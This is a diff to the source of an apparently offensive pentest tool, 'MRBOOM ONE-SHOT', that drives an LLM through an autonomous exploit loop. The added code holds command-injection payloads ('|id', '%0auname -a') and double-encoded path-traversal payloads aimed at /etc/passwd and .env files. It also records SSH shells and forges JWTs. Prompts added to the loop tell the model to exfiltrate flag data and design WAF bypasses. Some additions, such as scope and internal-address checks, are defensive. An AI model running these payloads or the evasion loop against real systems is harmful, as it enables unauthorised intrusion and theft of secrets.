@@ -12,7 +12,29 @@ Install: pip install fastapi uvicorn openai requests sse-starlette
 Run:      uvicorn app:app --port 8080
 """
 
-import json, os, uuid, hashlib, re, threading, time, socket, subprocess, urllib.request, urllib.error, urllib.parse, ssl, html as html_mod, asyncio, concurrent.futures, shutil, traceback, textwrap, inspect, random, string, ipaddress, math
+import json
+import os
+import uuid
+import hashlib
+import re
+import threading
+import time
+import socket
+import subprocess
+import urllib.request
+import urllib.error
+import urllib.parse
+import ssl
+import html as html_mod
+import asyncio
+import concurrent.futures
+import shutil
+import traceback
+import random
+import string
+import ipaddress
+import math
+import logging
 from datetime import datetime, timezone
 from pathlib import Path
 from markdown import markdown as md
@@ -23,13 +45,47 @@ from pydantic import BaseModel
 from typing import List, Optional
 import stealth
 
+# Optional .env support: load variables from a .env file if present.
+try:
+    from dotenv import load_dotenv
+    load_dotenv(os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env"))
+except Exception:
+    pass
+
 app = FastAPI(title="MRBOOM ONE-SHOT")
 app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])
 
 DATA_DIR = os.environ.get("DRDOOM_DATA_DIR") or os.path.dirname(os.path.abspath(__file__))
 
+# ─── FILE LOGGING ───────────────────────────────────────────────────────
+# All module logs land in ~/MrBOOM/logs/app.log with INFO/WARNING/ERROR levels.
+LOG_DIR = os.environ.get("MRBOOM_LOG_DIR") or os.path.join(DATA_DIR, "logs")
+os.makedirs(LOG_DIR, exist_ok=True)
+
+logger = logging.getLogger("mrboom")
+if not logger.handlers:
+    logger.setLevel(logging.INFO)
+    _log_fmt = logging.Formatter("%(asctime)s [%(levelname)s] %(name)s: %(message)s")
+    _fh = logging.FileHandler(os.path.join(LOG_DIR, "app.log"), encoding="utf-8")
+    _fh.setFormatter(_log_fmt)
+    logger.addHandler(_fh)
+    _sh = logging.StreamHandler()
+    _sh.setFormatter(_log_fmt)
+    logger.addHandler(_sh)
+
+def _log(level: str, msg: str):
+    getattr(logger, level, logger.info)(msg)
+
 # Optional shared-secret auth: set MRBOOM_API_KEY to require X-API-Key (or ?token=) on all API + SSE routes.
 AUTH_KEY = os.environ.get("MRBOOM_API_KEY", "")
+
+def _is_loopback(host: str) -> bool:
+    if not host or host in ("localhost", "127.0.0.1", "::1"):
+        return True
+    try:
+        return ipaddress.ip_address(host.split("%")[0]).is_loopback
+    except ValueError:
+        return False
 
 @app.middleware("http")
 async def _auth_gate(request: Request, call_next):
@@ -47,8 +103,77 @@ async def _startup():
     _main_loop = asyncio.get_running_loop()
     stealth.init()
 DB = {}  # engagement_id -> state
+DB_LOCK = threading.Lock()  # guards all DB reads/writes (FastAPI + background threads)
 HISTORY_DIR = os.path.join(DATA_DIR, "scan_history")
 os.makedirs(HISTORY_DIR, exist_ok=True)
+ENG_DIR = os.path.join(DATA_DIR, "engagements")  # live engagement persistence (survives restarts)
+os.makedirs(ENG_DIR, exist_ok=True)
+
+
+def persist_engagement(eid, lock_held=False):
+    """Snapshot one engagement to disk so it survives restarts."""
+    try:
+        # finalized runs live in scan_history only — don't resurrect a live copy
+        if os.path.exists(os.path.join(HISTORY_DIR, f"{eid}.json")):
+            _eng_live = os.path.join(ENG_DIR, f"{eid}.json")
+            if os.path.exists(_eng_live):
+                os.remove(_eng_live)
+            return
+        def _grab():
+            if eid not in DB:
+                return None
+            eng = DB[eid]
+            snap = {k: v for k, v in eng.items() if k not in ("_events",)}
+            snap["events"] = (snap.get("events") or [])[-200:]
+            snap["logs"] = (snap.get("logs") or [])[-800:]
+            return snap
+        if lock_held:
+            snap = _grab()
+        else:
+            with DB_LOCK:
+                snap = _grab()
+        if snap is None:
+            return
+        path = os.path.join(ENG_DIR, f"{eid}.json")
+        tmp = path + ".tmp"
+        with open(tmp, "w", encoding="utf-8") as f:
+            json.dump(snap, f, default=str)
+        os.replace(tmp, path)
+    except Exception as e:
+        _log("warning", f"persist_engagement({eid}) failed: {e}")
+
+
+def restore_engagements():
+    """Load persisted engagements into DB on boot. Ones left mid-run are
+    marked 'paused' — resume via POST /api/engagements/{eid}/run."""
+    restored = 0
+    for fname in os.listdir(ENG_DIR):
+        if not fname.endswith(".json"):
+            continue
+        try:
+            with open(os.path.join(ENG_DIR, fname), "r", encoding="utf-8") as f:
+                snap = json.load(f)
+        except Exception:
+            continue
+        eid = snap.get("id")
+        if not eid:
+            continue
+        with DB_LOCK:
+            if eid in DB:
+                continue
+            if snap.get("status") == "running":
+                snap["status"] = "paused"
+                snap["progress"] = "interrupted by restart — resumable"
+            snap.setdefault("logs", [])
+            snap.setdefault("events", [])
+            DB[eid] = snap
+            restored += 1
+    if restored:
+        _log("info", f"restored {restored} engagements from disk")
+    return restored
+
+
+restore_engagements()
 
 def _session_code():
     return ''.join(random.choices(string.ascii_uppercase, k=9))
@@ -320,20 +445,21 @@ def run_skill_generation_for_port(host: str, port: int, service: str, context_li
 
 def _emit_ir(eid: str, etype: str, payload: dict):
     """Helper to emit an event for a given engagement — works outside run_oneshot."""
-    if eid not in DB:
-        return
-    eng = DB[eid]
-    pair = {"harness": "skills", "model": "skill-engine"}
-    ev = {
-        "type": etype,
-        "ts": datetime.now(timezone.utc).isoformat(),
-        "source": {"pair": pair},
-        "payload": payload,
-        "task_id": eng.get("task_id", eid),
-    }
-    events_list = eng.setdefault("events", [])
-    events_list.append(ev)
-    eng["events"] = eng["events"][-200:]
+    with DB_LOCK:
+        if eid not in DB:
+            return
+        eng = DB[eid]
+        pair = {"harness": "skills", "model": "skill-engine"}
+        ev = {
+            "type": etype,
+            "ts": datetime.now(timezone.utc).isoformat(),
+            "source": {"pair": pair},
+            "payload": payload,
+            "task_id": eng.get("task_id", eid),
+        }
+        events_list = eng.setdefault("events", [])
+        events_list.append(ev)
+        eng["events"] = eng["events"][-200:]
     emit_sync("ir", ev)
 
 def skill_stats() -> dict:
@@ -344,9 +470,10 @@ def skill_stats() -> dict:
 
 def save_scan_history(eid):
     """Persist completed scan to disk as JSON."""
-    if eid not in DB:
-        return
-    eng = DB[eid]
+    with DB_LOCK:
+        if eid not in DB:
+            return
+        eng = DB[eid]
     record = {
         "id": eid,
         "code": eng.get("code", ""),
@@ -369,6 +496,12 @@ def save_scan_history(eid):
     path = os.path.join(HISTORY_DIR, f"{eid}.json")
     with open(path, "w", encoding="utf-8") as f:
         json.dump(record, f, indent=2, default=str)
+    try:
+        _eng_live = os.path.join(ENG_DIR, f"{eid}.json")
+        if os.path.exists(_eng_live):
+            os.remove(_eng_live)
+    except Exception:
+        pass
 
 def load_scan_history():
     """Load all past scans from disk."""
@@ -390,11 +523,12 @@ def delete_scan_history(eid):
     if os.path.exists(path):
         os.remove(path)
     # Also remove report file if it exists
-    if eid in DB:
-        rp = DB[eid].get("report_path", "")
-        if rp and os.path.exists(rp):
-            try: os.remove(rp)
-            except: pass
+    with DB_LOCK:
+        if eid in DB:
+            rp = DB[eid].get("report_path", "")
+            if rp and os.path.exists(rp):
+                try: os.remove(rp)
+                except: pass
 
 # ─── CROSS-SCAN MEMORY ──────────────────────────────────────────────────
 # Persistent per-target knowledge base: discoveries, probed endpoints, and
@@ -424,15 +558,20 @@ def _load_scan_memory(domain=""):
             probes.extend(mem.get("probes", []))
         except Exception:
             continue
-    # dedupe while keeping order
+    # dedupe while keeping order (JSON round-trip can turn tuples into
+    # unhashable lists — normalize before deduping)
+    _fp = [tuple(f) if isinstance(f, list) else f for f in fuzz_paths]
+    _find = [f for f in findings if isinstance(f, dict)]
+    _val = [f for f in validations if isinstance(f, dict)]
+    _prb = [p for p in probes if isinstance(p, dict)]
     return {
         "api_endpoints": list(dict.fromkeys(api_eps))[:120],
-        "fuzz_paths": list(dict.fromkeys(fuzz_paths))[:120],
+        "fuzz_paths": [list(f) if isinstance(f, tuple) else f for f in list(dict.fromkeys(_fp))][:120],
         "openapi_endpoints": list(dict.fromkeys(openapi_eps))[:80],
         "origins": list(dict.fromkeys(origins))[:30],
-        "findings": list({(f.get('type',''), f.get('url','')): f for f in findings}.values())[:80],
-        "validations": list({(f.get('type',''), f.get('url','')): f for f in validations}.values())[:80],
-        "probes": probes[-40:],
+        "findings": list({(f.get('type',''), f.get('url','')): f for f in _find}.values())[:80],
+        "validations": list({(f.get('type',''), f.get('url','')): f for f in _val}.values())[:80],
+        "probes": _prb[-40:],
     }
 
 def save_scan_memory(domain, data):
@@ -461,7 +600,6 @@ def save_scan_memory(domain, data):
             merged += [{**f, "first_seen": now_ts} for f in src if (f.get('type',''), f.get('url','')) not in {(x.get('type',''), x.get('url','')) for x in merged}]
             prev[k] = merged[-120:]
         # probed agentic endpoints + fuzz results
-        fuzz_seen = [], 
         prev["probes"] = list(prev.get("probes", [])) + [
             {"iter": s.get("iter"), "url": s.get("url"), "outcome": s.get("outcome"),
              "status": s.get("status"), "first_seen": now_ts}
@@ -471,6 +609,19 @@ def save_scan_memory(domain, data):
         prev["fuzz_paths"] = list(dict.fromkeys(list(prev.get("fuzz_paths", [])) + [
             (f.get("url"), f.get("status"), f.get("size", 0)) for f in (data.get("bb_fuzz") or []) if f.get("url")
         ]))[:200]
+        # infra skill-pack discoveries: LAN origin boxes + SSH shells (with flags)
+        for ip, ev in ([
+            (o.get("ip"), f"lan-origin:{o.get('match','')}:{o.get('title','')[:40]}")
+            for o in (data.get("bb_lan_sweep") or {}).get("origins", []) if o.get("ip")
+        ] + [
+            (r.get("host"), f"ssh-shell:{r.get('username','')}/{r.get('flag','')[:30]}")
+            for r in (data.get("bb_ssh_access") or []) if r.get("success") and r.get("host")
+        ]):
+            if ip and ip not in prev["origins"]:
+                prev["origins"].append(ip)
+                prev["probes"].append({"url": ip, "outcome": "ssh-shell" if "ssh-shell" in ev else "lan-origin",
+                                        "status": 0, "first_seen": now_ts, "evidence": ev[:120]})
+        prev["origins"] = prev["origins"][-40:]
         prev["last_scan"] = now_ts
         prev["runs"] = int(prev.get("runs", 0)) + 1
         tmp = path + ".tmp"
@@ -504,7 +655,8 @@ def _memory_prompt(domain, data):
                 lines.append("Previously probed endpoints that responded (worth re-visiting / deepening):")
                 for p in seen_ok[-15:]:
                     lines.append(f"- {p.get('url','?')} -> {p.get('outcome','?')} (HTTP {p.get('status')})")
-    return "\n".join(lines)
+        return "\n".join(lines)
+    return "NO_PREVIOUS_MEMORY"
 
 # ─── SSE MANAGER ─────────────────────────────────────────────────────────
 
@@ -570,7 +722,7 @@ def fetch_models(base_url, api_key):
             ctx.check_hostname = False
             ctx.verify_mode = ssl.CERT_NONE
             resp = urllib.request.urlopen(req, timeout=10, context=ctx)
-            data = json.loads(resp.read().decode())
+            data = json.loads(_read_body(resp))
             models = [m["id"] for m in data.get("data", []) if m.get("id")]
             if models:
                 return sorted(models)
@@ -611,7 +763,7 @@ def check_model(base_url, model, api_key):
             req = urllib.request.Request(url, data=body, headers={"Content-Type": "application/json", "Authorization": f"Bearer {api_key}", "User-Agent": stealth.ua()}, method="POST")
             ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
             resp = urllib.request.urlopen(req, timeout=15, context=ctx)
-            raw = resp.read().decode()
+            raw = _read_body(resp)
             data = _parse_maybe_ssd_json(raw)
             if data and "choices" in data:
                 return True
@@ -620,7 +772,7 @@ def check_model(base_url, model, api_key):
                 continue
             if e.code == 400:
                 try:
-                    err = json.loads(e.read().decode())
+                    err = json.loads(_read_body(e))
                     emsg = str(err).lower()
                     if "not found" in emsg or "not loaded" in emsg or "does not exist" in emsg:
                         return False
@@ -659,7 +811,7 @@ def call_model(base_url, model, api_key, messages, timeout=120):
                 ctx.check_hostname = False
                 ctx.verify_mode = ssl.CERT_NONE
                 resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
-                raw = resp.read().decode()
+                raw = _read_body(resp)
                 data = _parse_maybe_ssd_json(raw)
                 if not data or "choices" not in data:
                     continue
@@ -998,6 +1150,40 @@ class _NoRedirect(urllib.request.HTTPRedirectHandler):
     def redirect_request(self, req, fp, code, msg, headers, newurl):
         return None
 
+def _read_body(resp, limit=None):
+    """Read + decode an HTTP response body, honoring gzip/deflate/br.
+    urllib does NOT auto-decompress when Accept-Encoding was set by us, and
+    Cloudflare/nginx gzip almost everything — without this every body comes
+    back as binary junk. Works for HTTPResponse and HTTPError alike."""
+    try:
+        raw = resp.read(limit) if limit else resp.read()
+    except Exception:
+        return ""
+    try:
+        hdrs = dict(getattr(resp, "headers", None) or {})
+    except Exception:
+        hdrs = {}
+    enc = str(hdrs.get("Content-Encoding") or hdrs.get("content-encoding") or "").lower()
+    try:
+        if "gzip" in enc:
+            import gzip as _gzip
+            raw = _gzip.decompress(raw)
+        elif "deflate" in enc:
+            import zlib as _zlib
+            try:
+                raw = _zlib.decompress(raw)
+            except Exception:
+                raw = _zlib.decompress(raw, -_zlib.MAX_WBITS)
+        elif "br" in enc:
+            try:
+                import brotli as _brotli
+                raw = _brotli.decompress(raw)
+            except Exception:
+                pass
+    except Exception:
+        pass
+    return raw.decode("utf-8", "ignore")
+
 def http_get(url, timeout=8, host_header=None, no_redirect=False, extra_headers=None):
     try:
         headers = stealth.headers()
@@ -1024,7 +1210,7 @@ def http_get(url, timeout=8, host_header=None, no_redirect=False, extra_headers=
             resp = opener.open(req, timeout=timeout)
         else:
             resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
-        body = resp.read().decode("utf-8", errors="ignore")
+        body = _read_body(resp)
         return resp.status, dict(resp.headers), body
     except urllib.error.HTTPError as e:
         return e.code, dict(e.headers or {}), ""
@@ -1064,9 +1250,12 @@ def cvss_base_score(vector):
                 m[k.upper()] = v.upper()
         av = {"N": 0.85, "A": 0.62, "L": 0.55, "P": 0.2}.get(m.get("AV", "N"), 0.85)
         ac = {"L": 0.77, "H": 0.44}.get(m.get("AC", "L"), 0.77)
-        pr = {"N": 0.85, "L": 0.62, "H": 0.27}.get(m.get("PR", "N"), 0.85)
         ui = {"N": 0.85, "R": 0.62}.get(m.get("UI", "N"), 0.85)
-        scope = m.get("S", "U")
+        scope = m.get("S", "U") if m.get("S", "U") in ("U", "C") else "U"
+        # PR is scope-dependent in CVSS 3.1 (verified vs NVD, e.g. log4j S:C)
+        _pr_tbl = {"U": {"N": 0.85, "L": 0.62, "H": 0.27},
+                   "C": {"N": 0.85, "L": 0.68, "H": 0.50}}
+        pr = _pr_tbl[scope].get(m.get("PR", "N"), 0.85)
         c = {"H": 0.56, "L": 0.22, "N": 0.0}.get(m.get("C", "H"), 0.56)
         i = {"H": 0.56, "L": 0.22, "N": 0.0}.get(m.get("I", "H"), 0.56)
         a = {"H": 0.56, "L": 0.22, "N": 0.0}.get(m.get("A", "H"), 0.56)
@@ -1691,10 +1880,11 @@ def bb_webapp_scan(urls, timeout=30, host_map=None):
         # ── Command injection (diagnostics/ping/exec-style endpoints) ──
         if any(k in path for k in ("diag", "ping", "trace", "whois", "nslookup", "dns", "exec", "shell", "cmd", "tool")):
             for pname in ("host", "ip", "domain", "target", "addr"):
-                for payload, marker in (("|id", "uid="), ("%0aid", "uid="), ("|uname -a", "Linux")):
+                for payload, marker in (("|id", "uid="), ("%0aid", "uid="), ("|uname -a", "Linux"), ("%0auname -a", "Linux")):
                     if _time.time() > deadline:
                         break
-                    test_url = f"{u}?{pname}={urllib.parse.quote(payload, safe='')}"
+                    enc = payload if "%" in payload else urllib.parse.quote(payload, safe="")
+                    test_url = f"{u}?{pname}={enc}"
                     try:
                         _, _, body = http_get(test_url, timeout=5, host_header=hh)
                         if body and marker in body:
@@ -1705,13 +1895,15 @@ def bb_webapp_scan(urls, timeout=30, host_map=None):
         # ── Path traversal (download/file/view endpoints) ──
         if any(k in path for k in ("download", "file", "read", "view", "static", "export", "backup", "attachment")):
             for pname in ("file", "path", "name", "filename", "download"):
-                for payload in ("/etc/passwd", "/app/.env", "reports/../../../../etc/passwd"):
+                for payload in ("/etc/passwd", "/app/.env", "reports/../../../../etc/passwd",
+                                "..%252f..%252f..%252fetc/hosts", "%252e%252e%252f%252e%252e%252fetc/hosts"):
                     if _time.time() > deadline:
                         break
-                    test_url = f"{u}?{pname}={urllib.parse.quote(payload, safe='')}"
+                    enc = payload if "%" in payload else urllib.parse.quote(payload, safe="")
+                    test_url = f"{u}?{pname}={enc}"
                     try:
                         _, _, body = http_get(test_url, timeout=5, host_header=hh)
-                        if body and any(m in body for m in ("root:", "DATABASE_URL", "POSTGRES_PASSWORD", "BEGIN:", "PRIVATE KEY", "AcmeCorp production")):
+                        if body and any(m in body for m in ("root:", "DATABASE_URL", "POSTGRES_PASSWORD", "BEGIN:", "PRIVATE KEY", "AcmeCorp production", "127.0.0.1\tlocalhost", "127.0.0.1 localhost")):
                             findings.append({"url": test_url, "type": "Path Traversal", "severity": "HIGH", "score": 85, "asset": parsed.netloc, "cwe": "CWE-22", "title": f"Arbitrary File Read via {pname.title()} Parameter", "evidence": f"sensitive content marker in response ({payload})", "payload": payload})
                             break
                     except Exception:
@@ -1746,7 +1938,7 @@ def bb_webapp_scan(urls, timeout=30, host_map=None):
                         continue
                     conn = urllib.parse.urlunparse(parsed._replace(netloc=ip + ((":" + str(parsed.port)) if parsed.port else "")))
                     resp = urllib.request.urlopen(urllib.request.Request(conn, data=data, headers=headers), timeout=6, context=ctx)
-                    body = resp.read().decode("utf-8", "ignore")
+                    body = _read_body(resp)
                     if any(k in body.lower() for k in ("welcome,", "logged in", "dashboard", "sign out", "role: admin")):
                         findings.append({"url": u, "type": "SQL Injection (Auth Bypass)", "severity": "CRITICAL", "score": 90, "asset": parsed.netloc, "cwe": "CWE-89", "title": "SQL Injection Authentication Bypass on Login Form", "evidence": "login bypassed with SQLi payload", "payload": uname})
                         break
@@ -2016,7 +2208,7 @@ def bb_login_probe(urls, timeout=20):
                 ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                 resp = urllib.request.urlopen(req, timeout=5, context=ctx)
                 code = resp.status
-                body = resp.read().decode("utf-8", errors="ignore")[:400]
+                body = _read_body(resp)[:400]
                 resp.close()
             except urllib.error.HTTPError as e:
                 code = e.code
@@ -2214,7 +2406,7 @@ def bb_default_creds(urls, timeout=20):
                 req = urllib.request.Request(target, data=urllib.parse.urlencode({"username": user, "password": pwd, "email": user, "login": user}).encode(), headers={"Content-Type": "application/x-www-form-urlencoded", **stealth.headers()})
                 ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                 resp = urllib.request.urlopen(req, timeout=5, context=ctx)
-                body = resp.read().decode("utf-8", errors="ignore")
+                body = _read_body(resp)
                 resp.close()
                 code = resp.status
                 if code in (200, 302) and not any(k in body.lower() for k in ["invalid", "incorrect", "error", "wrong", "failed"]):
@@ -2244,7 +2436,7 @@ def bb_jwt_check(live_urls, api_eps=None, timeout=20):
                     ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                     resp_b = urllib.request.urlopen(req_b, timeout=4, context=ctx)
                     code_b = resp_b.status
-                    body_b = resp_b.read().decode("utf-8", errors="ignore")
+                    body_b = _read_body(resp_b)
                     ct_b = resp_b.headers.get("Content-Type", "")
                     resp_b.close()
                     if "json" not in ct_b.lower():
@@ -2254,7 +2446,7 @@ def bb_jwt_check(live_urls, api_eps=None, timeout=20):
                         req_a = urllib.request.Request(target, headers={"User-Agent": "Mozilla/5.0", "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4iLCJzdWIiOiIxIn0.e30"})
                         resp_a = urllib.request.urlopen(req_a, timeout=4, context=ctx)
                         code_a = resp_a.status
-                        body_a = resp_a.read().decode("utf-8", errors="ignore")
+                        body_a = _read_body(resp_a)
                         resp_a.close()
                     except urllib.error.HTTPError as e:
                         code_a = e.code
@@ -2317,7 +2509,7 @@ def _http_post(url, data, timeout=8, host_header=None, extra_headers=None):
         req = urllib.request.Request(conn_url, data=data.encode(), headers=headers)
         ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
         resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
-        body = resp.read().decode("utf-8", errors="ignore")
+        body = _read_body(resp)
         return resp.status, dict(resp.headers), body
     except urllib.error.HTTPError as e:
         return e.code, dict(e.headers or {}), ""
@@ -2439,20 +2631,25 @@ def _build_task_tree(data, attack_results, subs, http_results):
 
     return {"nodes": nodes, "stages": sorted(set(stages))}
 
-def _agentic_exploit_loop(domain, urls, data, base_url, model, api_key, iterations=4, emit=None):
+def _agentic_exploit_loop(domain, urls, data, base_url, model, api_key, iterations=4, emit=None, objective=""):
     """PentestGPT-style autonomous loop: the LLM proposes the next concrete
     exploit action from current findings, the harness executes it, and the
     outcome feeds back as context for the next proposal. Safe, read-only,
     bounded probes — never destructive, never privilege-escalating.
 
-    Unlike a naive loop, it builds a real attack surface from every recon
-    artifact (live URLs, OpenAPI spec paths, JS-discovered API endpoints,
-    dirbust results, confirmed origin IPs) so the model targets the actual
-    endpoints recon found instead of guessing generic paths."""
+    HARD-MODE upgrades:
+    - Injects the ACTUAL landing HTML + linked JS source into the prompt so
+      the model can see dev blocks, leaked route maps, hardcoded endpoints.
+    - Objective-aware: if `objective` is set (e.g. a flag regex), the loop
+      hunts for it and reports FLAG FOUND.
+    - WAF-evasion toolkit: the model is taught encoding bypasses (%0a newline,
+      %252e double-encoded dots, case/Unicode tricks) to get past blocklists.
+    - Hypothesis seeding: pass prior 0-day hypotheses so they get TESTED."""
     import json as _json
     steps = []
     history = []
     base_urls = [u for u in (urls or []) if "://" in u][:6]
+    FLAG_RE = re.compile(objective or r"NIMBUS\{[A-Za-z0-9_\-]+\}", re.I)
 
     def _add_surface(surface, seen, u, why):
         if not u or "://" not in u:
@@ -2462,6 +2659,52 @@ def _agentic_exploit_loop(domain, urls, data, base_url, model, api_key, iteratio
             return
         seen.add(u)
         surface.append({"url": u, "why": why})
+
+    def _fetch_page_context():
+        """Fetch landing pages + linked JS; return trimmed excerpts the model
+        can actually reason over (dev blocks, route maps, config leaks)."""
+        ctx_bits = []
+        seen_html = set()
+        for u in (base_urls or [])[:3]:
+            u0 = u.split("?")[0].rstrip("/") + "/"
+            if u0 in seen_html:
+                continue
+            seen_html.add(u0)
+            try:
+                st, _, body = http_get(u0, timeout=6)
+                if st == 200 and body:
+                    ctx_bits.append(f"[HTML {u0}] {body[:1500]}")
+                    # linked JS
+                    for m in re.finditer(r'src=["\']([^"\']+\.js[^"\']*)["\']', body):
+                        jp = m.group(1)
+                        if jp.startswith("//"):
+                            ju = "https:" + jp
+                        elif jp.startswith("/"):
+                            ju = urllib.parse.urlparse(u0)._replace(path=jp.split("?")[0]).geturl()
+                        elif jp.startswith("http"):
+                            ju = jp
+                        else:
+                            continue
+                        try:
+                            js_st, _, js_body = http_get(ju, timeout=6)
+                            if js_st == 200 and js_body:
+                                ctx_bits.append(f"[JS {ju}] {js_body[:2500]}")
+                        except Exception:
+                            pass
+            except Exception:
+                continue
+        return "\n".join(ctx_bits)[:9000]
+
+    def _waf_observations():
+        """Summarize what got blocked (403) vs allowed, so the model learns the
+        WAF's shape and can design bypasses."""
+        obs = []
+        for s in history:
+            if s.get("status") == 403:
+                obs.append(f"BLOCKED(403): {s.get('command','')[:100]}")
+            elif s.get("outcome") in ("api-open", "ok") and s.get("evidence"):
+                obs.append(f"OPEN({s.get('status')}): {s.get('url','')[:80]} -> {s.get('evidence','')[:120]}")
+        return obs[-12:]
 
     def _build_surface():
         surface, seen = [], set()
@@ -2511,6 +2754,54 @@ def _agentic_exploit_loop(domain, urls, data, base_url, model, api_key, iteratio
                 _add_surface(surface, seen, fu, "mem-confirmed")
         return surface[:60]
 
+    def _safe_target(target):
+        """Return (ok, reason). Blocks out-of-scope hosts and internal/
+        link-local/metadata addresses so the LLM agent can't pivot the
+        agentic loop into an SSRF / cloud-metadata / LAN oracle."""
+        try:
+            p = urllib.parse.urlparse(target)
+        except Exception:
+            return False, "unparsable url"
+        host = (p.hostname or "").lower()
+        if not host:
+            return False, "no host"
+        if p.scheme not in ("http", "https"):
+            return False, "scheme not allowed"
+        # Never touch link-local / loopback / private / multicast / metadata
+        # targets, whether given as a literal IP or resolved for a name.
+        def _ip_bad(ip):
+            try:
+                a = ipaddress.ip_address(ip)
+            except ValueError:
+                return True  # resolution gave us nothing usable -> block
+            return (a.is_private or a.is_loopback or a.is_link_local
+                    or a.is_multicast or a.is_reserved or a.is_unspecified)
+        candidates = [host]
+        try:
+            candidates += [i[4][0] for i in socket.getaddrinfo(host, None)]
+        except Exception:
+            pass
+        for c in candidates:
+            if _ip_bad(c):
+                return False, f"internal/reserved address ({c})"
+        # Link-local metadata IP aliases (169.254.169.254) also come via names.
+        if host in ("169.254.169.254", "metadata", "metadata.google.internal"):
+            return False, "cloud metadata"
+        # Host must be the target domain, a subdomain of its apex, or one of
+        # the known base_urls discovered by recon.
+        ap = apex_domain(host)
+        ap_target = apex_domain(domain)
+        if ap == ap_target or host == domain.lower():
+            return True, ""
+        for b in (base_urls or []):
+            try:
+                bh = urllib.parse.urlparse(b).hostname or ""
+            except Exception:
+                continue
+            if host == bh.lower() or ap == apex_domain(bh):
+                return True, ""
+        return False, f"host '{host}' out of scope for {domain}"
+
     def _safe_exec(command):
         """Parse an LLM-proposed command string like
         'GET /api/user?id=1', 'GET https://host/path',
@@ -2527,6 +2818,9 @@ def _agentic_exploit_loop(domain, urls, data, base_url, model, api_key, iteratio
                 host = base_urls[0].split("?")[0] if base_urls else f"https://{domain}/"
                 base = host.rstrip("/")
                 target = base + (target if target.startswith("/") else "/" + target)
+            ok, why = _safe_target(target)
+            if not ok:
+                return {"status": 0, "evidence": f"blocked: {why}", "method": method, "url": target}
             headers = {}
             body = None
             if method == "POST" and payload:
@@ -2539,13 +2833,24 @@ def _agentic_exploit_loop(domain, urls, data, base_url, model, api_key, iteratio
             if method in ("GET", "HEAD", "POST"):
                 req = urllib.request.Request(target, data=body, headers={**stealth.headers(), **headers}, method=method)
                 ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
+
+                class _ScopedRedirect(urllib.request.HTTPRedirectHandler):
+                    # A target may 302 the agent to an internal address — enforce
+                    # the same gate on every hop or drop it with a 999.
+                    def redirect_request(self, req_, fp, code, msg, hdrs, newurl):
+                        ok_, _ = _safe_target(newurl)
+                        if not ok_:
+                            return None
+                        return super().redirect_request(req_, fp, code, msg, hdrs, newurl)
+
+                _opener = urllib.request.build_opener(_ScopedRedirect())
                 try:
-                    resp = urllib.request.urlopen(req, timeout=8, context=ctx)
-                    st, hdrs, body_txt = resp.status, dict(resp.headers), resp.read().decode("utf-8", errors="ignore")
+                    resp = _opener.open(req, timeout=8, context=ctx)
+                    st, hdrs, body_txt = resp.status, dict(resp.headers), _read_body(resp)
                 except urllib.error.HTTPError as e:
                     st, hdrs = e.code, dict(e.headers or {})
                     try:
-                        body_txt = e.read().decode("utf-8", errors="ignore")
+                        body_txt = _read_body(e)
                     except Exception:
                         body_txt = ""
                 except Exception as e:
@@ -2582,6 +2887,8 @@ def _agentic_exploit_loop(domain, urls, data, base_url, model, api_key, iteratio
     surface = _build_surface()
     surf_txt = "\n".join(f"- {s['url']}  [{s['why']}]" for s in surface)
     origin_txt = ", ".join(o.get("ip", "") for o in (data.get("bb_origins") or []) if o.get("confirmed"))
+    page_ctx = _fetch_page_context()
+    hypotheses_txt = (data.get("ai_0day_hypotheses") or "")[:1500]
 
     for i in range(iterations):
         try:
@@ -2589,10 +2896,33 @@ def _agentic_exploit_loop(domain, urls, data, base_url, model, api_key, iteratio
                 "You are driving an autonomous penetration test as the 'generation' session.",
                 f"Target: {domain}",
                 "",
+            ]
+            if objective:
+                prompt_lines += [
+                    f"OBJECTIVE: find and exfiltrate data matching: {objective}",
+                    "A flag like this is typically stored in a secrets table, a flag file, or",
+                    "reachable via SQLi/traversal/RCE. Chain steps toward READING it.",
+                    "",
+                ]
+            prompt_lines += [
                 "KNOWN ATTACK SURFACE (from recon — prefer these over guessing):",
                 surf_txt if surf_txt else "- none discovered",
                 (f"Confirmed origin IPs (bypass CDN/WAF): {origin_txt}" if origin_txt else ""),
                 "",
+            ]
+            if page_ctx:
+                prompt_lines += [
+                    "RAW PAGE + JS CONTEXT (read for leaked endpoints, dev blocks, config, route maps):",
+                    page_ctx,
+                    "",
+                ]
+            if hypotheses_txt:
+                prompt_lines += [
+                    "0-DAY HYPOTHESES FROM EARLIER ANALYSIS (test the specific ones):",
+                    hypotheses_txt,
+                    "",
+                ]
+            prompt_lines += [
                 "Findings so far:",
                 *(f"- {f.get('severity','?')}: {f.get('type','?')} @ {f.get('url','?')} ({f.get('evidence','')[:110]})"
                   for f in (data.get('bb_attack') or [])[:8]),
@@ -2601,27 +2931,58 @@ def _agentic_exploit_loop(domain, urls, data, base_url, model, api_key, iteratio
                 *(f"- VALIDATION {f.get('severity','?')}: {f.get('title') or f.get('type','?')} @ {f.get('url','?')} ({f.get('evidence','')[:100]})" for f in (data.get('bb_validations') or [])[:8]),
                 "Previous steps:",
                 *(f"- {s.get('command')} -> {s.get('outcome')} ({s.get('evidence','')[:90]})" for s in history),
+            ]
+            waf_obs = _waf_observations()
+            if waf_obs:
+                prompt_lines += [
+                    "",
+                    "OBSERVED BLOCKING/OPEN BEHAVIOR (build WAF bypasses around this):",
+                    *waf_obs,
+                ]
+            prompt_lines += [
                 "",
-                "Propose ONE next concrete, LOW-RISK read-only probe (a single GET/POST request) that confirms or extends a finding.",
-                "Prefer the KNOWN ATTACK SURFACE endpoints. For API endpoints, test for IDOR/authz by tampering ids or missing tokens.",
